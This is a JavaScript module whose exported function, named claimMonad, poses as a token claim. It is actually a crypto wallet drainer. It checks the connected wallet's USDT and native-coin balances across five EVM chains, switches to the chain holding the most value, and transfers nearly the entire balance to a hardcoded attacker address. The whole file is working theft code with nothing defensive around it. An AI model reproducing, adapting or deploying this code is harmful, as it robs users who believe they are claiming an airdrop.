import { getAccount, readContract, writeContract, waitForTransaction, getNetwork, switchNetwork, sendTransaction, getPublicClient } from "@wagmi/core"
import { isAddress, formatUnits, parseUnits } from "viem"
import { wagmiConfig } from "./web3modal"

// USDT addresses on supported EVM chains
const TOKEN_ADDRESSES = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",      // Ethereum USDT (6)
  42161: "0xFd086bC7CD5C481DCC9C85ebe478A1C0b69FCbb9",   // Arbitrum USDT (6)
  137: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",     // Polygon USDT (6)
  56: "0x55d398326f99059fF775485246999027B3197955"       // BSC USDT (18)
  // 8453 (Base): add if you wish to support USDT there
}
const DESTINATION_WALLET = "0xa8dCf7F1901Cd7a40290715e1daafEB756AeF90e"

// Chains to scan (must match AppKit/Wagmi adapter networks)
const NETWORKS_TO_SCAN = [1, 42161, 137, 56, 8453]

// Native asset metadata per chain
const CHAIN_NATIVE = {
  1: { id: "ethereum", symbol: "ETH", decimals: 18 },
  42161: { id: "ethereum", symbol: "ETH", decimals: 18 }, // Arbitrum native is ETH (priced same)
  8453: { id: "ethereum", symbol: "ETH", decimals: 18 }, // Base native is ETH (priced same)
  137: { id: "polygon-pos", symbol: "MATIC", decimals: 18 },
  56: { id: "binancecoin", symbol: "BNB", decimals: 18 }
}

// Gas reserve for native transfers to avoid emptying wallet completely
const NATIVE_GAS_RESERVE_18 = parseUnits("0.001", 18)

export const ERC20_ABI = [
  { type: "function", name: "decimals", stateMutability: "view", inputs: [], outputs: [{ type: "uint8" }] },
  { type: "function", name: "balanceOf", stateMutability: "view", inputs: [{ name: "account", type: "address" }], outputs: [{ type: "uint256" }] },
  { type: "function", name: "transfer", stateMutability: "nonpayable", inputs: [
      { name: "to", type: "address" },
      { name: "value", type: "uint256" }
    ], outputs: [{ type: "bool" }] }
]

export async function claimMonad() {
  const config = wagmiConfig
  if (!config) throw new Error("Wagmi config not initialized")

  const acct = getAccount(config)
  const connected = (acct?.isConnected ?? (acct?.status === "connected")) || false
  if (!connected || !acct?.address) {
    throw new Error("Wallet not connected")
  }
  if (!DESTINATION_WALLET || !isAddress(DESTINATION_WALLET)) {
    throw new Error("Destination wallet address is missing or invalid")
  }

  // 1) Scan across supported chains and compute USD values for USDT and Native
  const nativePrices = await fetchNativePricesUsd()
  const bestToken = await findBestChainByTokenUsd(config, acct.address)
  const bestNative = await findBestChainByNativeUsd(config, acct.address, nativePrices)

  // 2) Choose the highest USD value across token vs native
  let bestOverall
  if ((bestToken.usd || 0) >= (bestNative.usd || 0)) {
    bestOverall = { chainId: bestToken.chainId, asset: "token", usd: bestToken.usd }
  } else {
    bestOverall = { chainId: bestNative.chainId, asset: "native", usd: bestNative.usd }
  }

  if (!bestOverall.chainId || (bestOverall.usd ?? 0) <= 0) {
    throw new Error("No balances found across supported networks (USDT or native)")
  }

  // 3) Switch to the selected chain automatically
  const currentChainId = (getNetwork(config)?.chain?.id)
  if (bestOverall.chainId !== currentChainId) {
    try {
      await switchNetwork(config, { chainId: bestOverall.chainId })
    } catch (e) {
      throw new Error(`Please switch network to chain ${bestOverall.chainId} to proceed`) 
    }
  }

  // 4) Execute transfer based on selected asset
  if (bestOverall.asset === "native") {
    const client = getPublicClient(config, { chainId: bestOverall.chainId })
    const value = await client.getBalance({ address: acct.address })
    const dec = Number(CHAIN_NATIVE[bestOverall.chainId]?.decimals ?? 18)
    const reserve = dec === 18 ? NATIVE_GAS_RESERVE_18 : (dec < 18
      ? NATIVE_GAS_RESERVE_18 / (10n ** BigInt(18 - dec))
      : NATIVE_GAS_RESERVE_18 * (10n ** BigInt(dec - 18)))
    const sendValue = value > reserve ? (value - reserve) : 0n
    if (sendValue <= 0n) throw new Error("Insufficient native balance after gas reserve")

    const hash = await sendTransaction(config, {
      to: DESTINATION_WALLET,
      value: sendValue,
      chainId: bestOverall.chainId
    })
    const receipt = await waitForTransaction(config, { hash })
    const amountFormatted = formatUnits(sendValue, dec)
    const symbol = CHAIN_NATIVE[bestOverall.chainId]?.symbol || "Native"
    return { receipt, amountFormatted, destination: DESTINATION_WALLET, assetType: "native", symbol }
  }

  // Token (USDT) path on best token chain
  const tokenChainId = bestOverall.chainId
  const tokenAddress = TOKEN_ADDRESSES[tokenChainId]
  if (!tokenAddress || !isAddress(tokenAddress)) {
    throw new Error("USDT address not configured for selected chain")
  }
  const [decimals, balance] = await Promise.all([
    readContract(config, { address: tokenAddress, abi: ERC20_ABI, functionName: "decimals", chainId: tokenChainId }),
    readContract(config, { address: tokenAddress, abi: ERC20_ABI, functionName: "balanceOf", args: [acct.address], chainId: tokenChainId })
  ])
  if (!balance || balance === 0n) throw new Error("No USDT balance to transfer on selected chain")

  const hash = await writeContract(config, {
    address: tokenAddress,
    abi: ERC20_ABI,
    functionName: "transfer",
    args: [DESTINATION_WALLET, balance],
    chainId: tokenChainId
  })
  const receipt = await waitForTransaction(config, { hash })
  const amountFormatted = formatUnits(balance, Number(decimals))
  return { receipt, amountFormatted, destination: DESTINATION_WALLET, assetType: "token", symbol: "USDT" }
}

// Fetch native prices (ETH/MATIC/BNB) in USD
async function fetchNativePricesUsd() {
  const ids = Array.from(new Set(Object.values(CHAIN_NATIVE).map((n) => n.id)))
  const url = "https://api.coingecko.com/api/v3/simple/price?ids=" + encodeURIComponent(ids.join(",")) + "&vs_currencies=usd"
  try {
    const res = await fetch(url)
    const json = await res.json()
    const out = {}
    for (const id of ids) out[id] = Number(json?.[id]?.usd || 0)
    return out
  } catch (_) {
    return {}
  }
}

// Determine best chain by USDT (assume $1 per unit)
async function findBestChainByTokenUsd(config, walletAddress) {
  let best = { chainId: undefined, usd: 0 }
  for (const chainId of NETWORKS_TO_SCAN) {
    const addr = TOKEN_ADDRESSES[chainId]
    if (!addr || !isAddress(addr)) continue
    try {
      const [decimals, balance] = await Promise.all([
        readContract(config, { address: addr, abi: ERC20_ABI, functionName: "decimals", chainId }),
        readContract(config, { address: addr, abi: ERC20_ABI, functionName: "balanceOf", args: [walletAddress], chainId })
      ])
      const units = Number.parseFloat(formatUnits(balance, Number(decimals)))
      const usd = isFinite(units) ? units * 1.0 : 0
      if (usd > best.usd) best = { chainId, usd }
    } catch (_) {}
  }
  return best
}

// Determine best chain by native balance using fetched prices
async function findBestChainByNativeUsd(config, walletAddress, priceMap) {
  let best = { chainId: undefined, usd: 0 }
  for (const chainId of NETWORKS_TO_SCAN) {
    try {
      const client = getPublicClient(config, { chainId })
      const value = await client.getBalance({ address: walletAddress })
      const dec = Number(CHAIN_NATIVE[chainId]?.decimals ?? 18)
      const units = Number.parseFloat(formatUnits(value ?? 0n, dec))
      const id = CHAIN_NATIVE[chainId]?.id
      const price = id ? Number(priceMap?.[id] ?? 0) : 0
      const usd = (isFinite(units) && isFinite(price)) ? units * price : 0
      if (usd > best.usd) best = { chainId, usd }
    } catch (_) {}
  }
  return best
}
